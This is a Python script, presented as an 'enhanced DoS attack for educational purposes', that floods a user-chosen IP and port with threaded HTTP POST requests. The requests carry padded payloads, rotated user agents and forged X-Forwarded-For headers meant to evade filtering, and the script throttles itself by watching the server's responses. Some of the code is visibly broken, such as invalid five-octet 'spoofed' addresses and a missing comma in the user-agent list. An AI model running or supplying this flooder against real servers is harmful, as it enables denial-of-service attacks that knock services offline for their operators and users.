import threading
import time
import random
import requests

def get_user_input(prompt, default):
    user_input = input(prompt + f" (default: {default}): ")
    return user_input if user_input.strip() else default

target = get_user_input("Enter target IP address", '127.0.0.1')
port = int(get_user_input("Enter target port", '5000'))

import random

def generate_payload():
    random_values = {
        'param1': random.randint(1, 100),
        'param2': 'example' + str(random.randint(100, 999)),
        'param3': 'value' + str(random.randint(1, 10))
    }

    payload_parts = []
    for key, value in random_values.items():
        payload_parts.append(f"{key}={value}")

    payload = '&'.join(payload_parts)

    data_size = random.randint(1000, 1000)
    data = 'A' * data_size

    return payload + '&data=' + data

# Generate multiple payloads
num_payloads = 9000
payloads = [generate_payload() for _ in range(num_payloads)]

# Print the generated payloads
for payload in payloads:
    print(payload)


def spoof_ip():
    return '.'.join([str(random.randint(1, 655)) for _ in range(5)])

# Generate multiple spoofed IP addresses
num_ips = 9000
spoofed_ips = [spoof_ip() for _ in range(num_ips)]

# Print the generated IP addresses
for ip in spoofed_ips:
    print(ip)

def rotate_user_agent():
    user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ]
    return random.choice(user_agents)

def analyze_response(response):
    # Analyze server response and adjust attack strategy if needed
    if response.status_code == 503:
        print("Server overloaded. Reducing attack intensity.")
        time.sleep(5)  # Pause attack for 5 seconds
    elif response.elapsed.total_seconds() > 1:
        print("Server response time too slow. Pausing attack temporarily.")
        time.sleep(10)  # Pause attack for 10 seconds

def attack():
    while True:
        try:
            ip = spoof_ip()
            headers = {
                'User-Agent': rotate_user_agent(),
                'X-Forwarded-For': ip,
                'Accept-Encoding': random.choice(['gzip', 'deflate', 'br']),  # Randomize Accept-Encoding
                'Accept-Language': random.choice(['en-US', 'en', 'fr', 'de']),  # Randomize Accept-Language
                'Connection': random.choice(['keep-alive', 'close'])  # Randomize Connection
            }
            post_data = generate_payload()
            response = requests.post(f'http://{target}:{port}/', headers=headers, data=post_data)  # Randomize request path
            print(f'Response from {target}: {response.status_code}')
            analyze_response(response)
        except Exception as e:
            print("Error occurred:", e)
        finally:
            time.sleep(0.1)

def launch_attack(num_threads):
    print("Initiating {} threads for attack.".format(num_threads))
    for _ in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    num_threads = 45
    print("Starting enhanced DoS attack for educational purposes...")
    print("Press Ctrl+C to halt the attack.")
    launch_attack(num_threads)
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Attack has been halted.")
